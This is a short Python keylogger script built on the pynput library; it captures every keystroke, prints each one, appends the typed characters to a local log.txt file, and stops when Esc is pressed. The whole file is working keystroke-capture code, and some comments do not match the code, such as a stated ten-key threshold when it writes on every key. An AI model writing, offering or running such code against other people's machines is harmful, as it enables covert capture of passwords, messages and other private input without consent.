# Importing pynput package
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

# press = function when a key is press
def press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # if the count exceed 10, it will overwrite the log.txt file
    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []

# writeFile = function to write all keys to a file
def writeFile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            # This will remove "" and ''
            quote = str(key).replace("'", "")

            # This will find in key if there is space
            # it will go to next line
            if quote.find("space") > 0:
                f.write('\n')

            # This will just write the key into the file
            elif quote.find("Key") == -1:
                f.write(quote)

# release = function when a key is release
def release(key):
    # To escape the loop, click Esc
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()